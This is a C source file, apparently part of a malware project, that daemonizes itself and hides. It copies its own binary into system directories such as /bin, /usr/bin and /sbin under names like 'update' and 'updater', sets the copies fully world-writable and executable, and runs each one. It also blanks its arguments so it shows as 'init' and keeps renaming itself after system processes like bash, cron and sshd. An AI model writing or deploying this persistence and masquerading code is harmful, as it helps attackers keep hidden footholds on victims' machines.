#include <stdlib.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>
#include <pthread.h>
#include "headers/daemon.h"

void* rename_process(void* arg) {
    while (1) {
        const char* names[] = {"init", "bash", "cron", "sshd"};
        const char* new_name = names[rand() % 4];
        strncpy((char*)getenv("_"), new_name, strlen(new_name));
        sleep(15);  // 15s better?
    }
    return NULL;
}

int copy_file(const char *src, const char *dst) {
    char buf[1024];
    size_t size;

    FILE* source = fopen(src, "rb");
    if (!source) {
        return -1;
    }

    FILE* dest = fopen(dst, "wb");
    if (!dest) {
        fclose(source);
        return -1;
    }

    while ((size = fread(buf, 1, 1024, source)) > 0) {
        fwrite(buf, 1, size, dest);
    }

    fclose(source);
    fclose(dest);

    return chmod(dst, S_IRWXU | S_IRWXG | S_IRWXO);
}

void run_clone(const char *path, int argc, char** argv) {
    pid_t pid = fork();
    if (pid == 0) {
        overwrite_argv(argc, argv);
        execl(path, path, (char *)NULL);
        exit(EXIT_SUCCESS);
    }
}

void overwrite_argv(int argc, char** argv) {
    for (int i = 0; i < argc; i++) {
        memset(argv[i], 0, strlen(argv[i]));
    }
    strncpy(argv[0], "init", strlen("init"));
}

void daemonize(int argc, char** argv) {
    pid_t pid = fork();
    if (pid < 0) {
        exit(EXIT_FAILURE);
    }
    if (pid > 0) {
        exit(EXIT_SUCCESS);
    }
    umask(0);
    pid_t sid = setsid();
    if (sid < 0) {
        exit(EXIT_FAILURE);
    }
    if ((chdir("/")) < 0) {
        exit(EXIT_FAILURE);
    }
    close(STDIN_FILENO);
    close(STDOUT_FILENO);
    close(STDERR_FILENO);

    const char* dirs[] = {
        "/usr/local/sbin/",
        "/usr/local/bin/",
        "/sbin/",
        "/bin/",
        "/usr/sbin/",
        "/usr/bin/",
        "/usr/games/",
        "/usr/local/games/",
        "/snap/bin/"
    };
    const char* daemon_names[] = {"update", "lists", "servers", "updater"};
    int daemon_names_count = sizeof(daemon_names) / sizeof(daemon_names[0]);

    char source_path[256];
    char dest_path[256];

    if (readlink("/proc/self/exe", source_path, sizeof(source_path)) == -1) {
        exit(EXIT_FAILURE);
    }

    for (int i = 0; i < sizeof(dirs) / sizeof(dirs[0]); i++) {
        for (int j = 0; j < daemon_names_count; j++) {
            snprintf(dest_path, sizeof(dest_path), "%s%s", dirs[i], daemon_names[j]);
            if (copy_file(source_path, dest_path) == 0) {
                run_clone(dest_path, argc, argv);
            }
        }
    }

    pthread_t rename_thread;
    pthread_create(&rename_thread, NULL, rename_process, NULL);
}